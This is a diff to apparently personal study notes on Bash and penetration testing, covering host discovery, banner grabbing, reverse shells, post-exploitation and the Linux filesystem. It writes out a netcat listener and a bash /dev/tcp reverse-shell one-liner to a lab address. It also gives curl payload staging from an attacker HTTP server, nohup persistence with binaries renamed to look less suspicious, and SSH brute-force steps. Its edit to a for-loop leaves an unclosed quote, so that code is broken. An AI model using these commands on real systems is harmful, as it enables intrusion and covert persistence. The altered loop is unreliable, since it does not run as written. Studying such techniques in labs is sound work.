@@ -153,7 +153,7 @@
   done
   
 * for
-  for variable in LIST; do
+  for variable in "${LIST[@]}; do
     # run commands
   done
   
@@ -233,6 +233,8 @@
 * timeout command run commands and exit after certain amount of time
   $ timeout 10s cmd
   
+############################### Reconaissance #################################
+  
 # Host Discovery
 * Nmap ping sweep. Find live hosts on a network by sending them a ping command
   - $ nmap -sn 172.16.10.0/24
@@ -250,32 +252,152 @@
     TCP handshake - no ACK packet is sent
   * Only scan the top 1,000 popular ports
   * Only scan TCP ports, not UDP
+* Rustscan
+  - $ rustscan -a (address arg) 172.16.10.0/24
+  - -g greppable flag cleaner output
+  - -r range of ports 1-1024
+* Netcat
+  - $ nc -z (zero input/output won't send any data) -v (verbose flag) 
+    <target ip> <ports>
+
+# Banner Grabbing
+* The process of extracting the information published by remote network
+  services when a connection is established. 
+* Services often transmit banners to greet clients
+  - SSH Servers, FTP, Telnet, network printers, IOT devices...
+ 
+ * Active banner grabbing - we can connect to port on the target ip addr. 
+   A small advert or banner is shown
+   
+* HTTP Head requests with curl or netcat
+   
+
+# Detecting Operating Systems
+* Possible with TCP/IP fingerprinting
+  - $ sudo nmap -O -iL <ip_addr file>
 
 
+# Scanning websites
+* Nikto
+  - banner grabbing, and basic security analysis 
+  - XSS, clickjacking, directory indexing
+  - $ nikto -host <ip> -port <port>
 
+############################### Reverse Shells ################################
 
-
-
-
-
-
-
-
-    
-    
-    
-    
-    
-    
-    
-    
+# Reverse Shells
+* Ingress vs. Egress Controls
+  - Ingress: Incoming connections
+  - Egress: Outgoing connections
+* Require payload and listener
+  - payload runs on the target machine
+  - shell listener is a program that runs on the attacker machine to receive
+    incoming reverse shell connections from comprimised targets
+    listens on a specific port waiting for connection to be established
+    and provides interactive shell session where the attacker can enter cmds 
+    to the target
+* Setup a listener:
+  - $ nc -l -p <port> -vv
+    netcat listen on port
+  - $ bash -c 'bash -i >& /dev/tcp/172.16.10.1/1337 0>&1'
+    - bash -c runs cmd inside the single quotes in a new instance of bash
+    - bash -i starts interactive bash shell
+    - >& /dev/tcp/172.16.10.1/1337 redirects stdout 1 & stderr 2 of the
+      interactive bash shell to a TCP connection at ip addr 172.16.10.1
+      port 1337. Essentially sends output of a shell to a remote server
+    - 0>&1 redirects stdin 0 of interactive bash shell to come from the 
+      same place as the stdout 1. makes shell accept input from the TCP
+      connection - thus remote server can send cmds to be executed by the shell
+  - For OS cmd injection in the book, use the | pipe to run the cmd from
+    donate page directly into the os.
   
-
-
-
-
-
+# Post exploitation binary staging
+* The target may not have certain binaries or files required.
+  - Create an http server with python on attacking machine
+    - $ python -m http.server
+  - Then download files using ex. curl
+    - $ curl -O http://172.16.10.1:8000/<filename>
+  - The file can then be transferred to the target machine
+  - Can also download binaries from trusted sites 
+* Persistance
+  - Write a program so that the target constantly connects to attacker
+  - send the process to the background & keep running with nohup
+  - $ nohup ./reverse_shell_monitor.sh > /dev/null 2>&1 &
+  - Change the binary name to something less suspicious
   
+# Initial Access With Brute Force
+* ssh 
+  - Allows both password-based and key-based authentication
+* Brute Force
+  - dictionary-based brute-force attack against an SSH Server 
+  - list of usernames, list of passwords
+
+############################# Local Info Gathering ############################
+
+# The Filesystem Hierarchy Standard
+  Directory     Description
+      /         primary parent dir called root
+    /var        dir for nonstatic variable files. contains application logfiles
+                or processed tasks such as scheduled and print jobs. also cache
+    /etc        dir for config files .conf also contains /etc/passwd, 
+                /etc/group and /etc/shadow where usr accounts, group info and 
+                password hashes exist
+    /bin        dir for binary utulities. stores bin
+    /sbin       dir for system bins
+    /dev        dir provides access to device files,  like disk partitions,
+                thumb drives, and external hard drives
+    /boot       dir for bootloaders, kernel files, and RAM
+    /home       dr containing home dir of local system user accounts.
+                active system user accounts usually have subdir as their 
+                assigned home dir
+    /root       dir containing home dir of root user account
+    /tmp        dir for temporarily written files and dirs
+    /proc       virtual filesystem for processes and kernel data
+    /usr        dir for user bins, man pages & kernel srcs, header files
+    /run        dir for runtime data. describes the state of the system since
+                it was last booted
+    /opt        dir for software apps
+    /mnt        dir for mounting network shares or other network devices.
+                used for mounting devices to local filesystem
+    /media      dir for removable devices, CD drives
+    /lib, /lib32, /lib64 dir for shred libs needed to boot system 
+    /srv        dir for data commonly served by network services
+    
+# Users and Groups
+* Local Accounts
+  - User accounts can be found in /etc/passwd and groups in /etc/group
   
-  
+  /etc/passwd fields seperated by colons
+  Account  Password  User ID  Group ID  Comment  Home directory  Default shell
+  root     x         0        0         root     /root           /bin/bash
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
